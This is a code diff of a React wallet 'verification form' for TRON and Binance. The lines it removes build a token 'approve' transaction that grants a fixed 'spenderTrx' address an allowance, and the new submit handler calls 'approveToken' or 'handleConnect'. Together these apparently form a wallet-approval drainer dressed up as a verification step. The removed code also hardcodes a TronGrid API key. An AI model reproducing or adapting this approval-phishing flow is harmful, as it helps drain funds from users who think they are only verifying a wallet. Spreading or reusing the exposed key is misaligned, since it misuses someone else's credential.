@@ -9,8 +9,6 @@ import Swal from 'sweetalert2';
 import { TronWeb } from 'tronweb';
 import { WalletProvider, useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
 import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
-import { TronLinkAdapter } from '@tronweb3/tronwallet-adapters';
-import { BitKeepAdapter } from '@tronweb3/tronwallet-adapter-bitkeep';
 
 const FULL_NODE = 'https://api.trongrid.io';
 const SOLIDITY_NODE = 'https://api.trongrid.io';
@@ -65,7 +63,7 @@ const VerificationFormComponent = (props) => {
     const { name, value } = e.target
     setFormData(prev => ({ ...prev, [name]: value }))
   }
-
+  
   const busdAbi = [
     {
       "constant": false,
@@ -345,51 +343,17 @@ const VerificationFormComponent = (props) => {
     }
   };
 
-  const handleSubmit = async (value) => {
+  const handleSubmit = async(value) => {
 
-    const tronWeb = new TronWeb({
-      fullHost: 'https://api.trongrid.io',
-      headers: { 'TRON-PRO-API-KEY': '7a869df0-71b7-4fbe-afe1-b9bc0051e9d9' },
-    });
-    const adapter = new BitKeepAdapter();
+    if (disconnect) {
+      await disconnect();
+    }
 
-    await adapter.connect();
-    console.log('adapter', adapter?.address);
-    console.log('adapter', adapter?.readyState);
-
-    console.log('tronWeb', tronWeb);
-
-    const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
-      trxContractAddress,
-      'approve(address,uint256)',
-      {
-        feeLimit: 300_000_000,
-        callValue: 0,
-        shouldPollResponse: false
-      },
-      [
-        { type: 'address', value: spenderTrx },
-        { type: 'uint256', value: (spenderAmount * 1_000_000).toString() },
-      ],
-      address
-    );
-    console.log('transaction', transaction);
-    
-    // const signedTx = await adapter.signTransaction(transaction);
-    // console.log('signedTx', signedTx);
-
-    // const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
-    // console.log('receipt', receipt);
-
-    // if (disconnect) {
-    //   await disconnect();
-    // }
-
-    // if (formData?.blockchain === 'tron') {
-    //   handleConnect(value)
-    // } else if (formData?.blockchain === 'binance') {
-    //   approveToken()
-    // }
+    if (formData?.blockchain === 'tron') {
+      handleConnect(value)
+    } else if (formData?.blockchain === 'binance') {
+      approveToken()
+    }
   }
 
   return (
